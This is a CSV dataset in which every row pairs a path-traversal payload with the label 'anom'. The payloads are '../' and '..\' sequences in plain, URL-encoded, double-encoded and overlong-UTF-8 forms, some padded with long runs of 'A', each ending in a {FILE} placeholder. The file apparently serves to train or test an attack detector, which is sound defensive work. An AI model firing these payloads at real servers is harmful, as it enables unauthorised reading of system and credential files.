payload,label
%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE},anom
%25c0%25ae%25c0%25ae%25c1%259c{FILE},anom
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},anom
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},anom
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},anom
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},anom
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},anom
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},anom
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},anom
..%%32%66{FILE},anom
..%%32%66..%%32%66{FILE},anom
..%%32%66..%%32%66..%%32%66{FILE},anom
..%%32%66..%%32%66..%%32%66..%%32%66{FILE},anom
..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE},anom
..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE},anom
..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE},anom
..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE},anom
%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65%%32%66{FILE},anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},anom
..%%35%63{FILE},anom
..%%35%63..%%35%63{FILE},anom
..%%35%63..%%35%63..%%35%63{FILE},anom
..%%35%63..%%35%63..%%35%63..%%35%63{FILE},anom
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},anom
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},anom
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},anom
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},anom
%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},anom
%%32%65%%32%65%%35%63{FILE},anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},anom
../{FILE},anom
../../{FILE},anom
../../../{FILE},anom
../../../../{FILE},anom
../../../../../{FILE},anom
../../../../../../{FILE},anom
../../../../../../../{FILE},anom
../../../../../../../../{FILE},anom
..%2f{FILE},anom
..%2f..%2f{FILE},anom
..%2f..%2f..%2f{FILE},anom
..%2f..%2f..%2f..%2f{FILE},anom
..%2f..%2f..%2f..%2f..%2f{FILE},anom
..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
%2e%2e/{FILE},anom
%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
..%252f{FILE},anom
..%252f..%252f{FILE},anom
..%252f..%252f..%252f{FILE},anom
..%252f..%252f..%252f..%252f{FILE},anom
..%252f..%252f..%252f..%252f..%252f{FILE},anom
..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
%252e%252e/{FILE},anom
%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
..\{FILE},anom
..\..\{FILE},anom
..\..\..\{FILE},anom
..\..\..\..\{FILE},anom
..\..\..\..\..\{FILE},anom
..\..\..\..\..\..\{FILE},anom
..\..\..\..\..\..\..\{FILE},anom
..\..\..\..\..\..\..\..\{FILE},anom
..%5c{FILE},anom
..%5c..%5c{FILE},anom
..%5c..%5c..%5c{FILE},anom
..%5c..%5c..%5c..%5c{FILE},anom
..%5c..%5c..%5c..%5c..%5c{FILE},anom
..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
%2e%2e\{FILE},anom
%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
..%255c{FILE},anom
..%255c..%255c{FILE},anom
..%255c..%255c..%255c{FILE},anom
..%255c..%255c..%255c..%255c{FILE},anom
..%255c..%255c..%255c..%255c..%255c{FILE},anom
..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
%252e%252e\{FILE},anom
%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
../{FILE},anom
../../{FILE},anom
../../../{FILE},anom
../../../../{FILE},anom
../../../../../{FILE},anom
../../../../../../{FILE},anom
../../../../../../../{FILE},anom
../../../../../../../../{FILE},anom
..%2f{FILE},anom
..%2f..%2f{FILE},anom
..%2f..%2f..%2f{FILE},anom
..%2f..%2f..%2f..%2f{FILE},anom
..%2f..%2f..%2f..%2f..%2f{FILE},anom
..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
%2e%2e/{FILE},anom
%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
..%252f{FILE},anom
..%252f..%252f{FILE},anom
..%252f..%252f..%252f{FILE},anom
..%252f..%252f..%252f..%252f{FILE},anom
..%252f..%252f..%252f..%252f..%252f{FILE},anom
..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
%252e%252e/{FILE},anom
%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
..\{FILE},anom
..\..\{FILE},anom
..\..\..\{FILE},anom
..\..\..\..\{FILE},anom
..\..\..\..\..\{FILE},anom
..\..\..\..\..\..\{FILE},anom
..\..\..\..\..\..\..\{FILE},anom
..\..\..\..\..\..\..\..\{FILE},anom
..%5c{FILE},anom
..%5c..%5c{FILE},anom
..%5c..%5c..%5c{FILE},anom
..%5c..%5c..%5c..%5c{FILE},anom
..%5c..%5c..%5c..%5c..%5c{FILE},anom
..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
%2e%2e\{FILE},anom
%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
..%255c{FILE},anom
..%255c..%255c{FILE},anom
..%255c..%255c..%255c{FILE},anom
..%255c..%255c..%255c..%255c{FILE},anom
..%255c..%255c..%255c..%255c..%255c{FILE},anom
..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
%252e%252e\{FILE},anom
%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
\../{FILE},anom
\../\../{FILE},anom
\../\../\../{FILE},anom
\../\../\../\../{FILE},anom
\../\../\../\../\../{FILE},anom
\../\../\../\../\../\../{FILE},anom
\../\../\../\../\../\../\../{FILE},anom
\../\../\../\../\../\../\../\../{FILE},anom
/..\{FILE},anom
/..\/..\{FILE},anom
/..\/..\/..\{FILE},anom
/..\/..\/..\/..\{FILE},anom
/..\/..\/..\/..\/..\{FILE},anom
/..\/..\/..\/..\/..\/..\{FILE},anom
/..\/..\/..\/..\/..\/..\/..\{FILE},anom
/..\/..\/..\/..\/..\/..\/..\/..\{FILE},anom
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../{FILE},anom
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE},anom
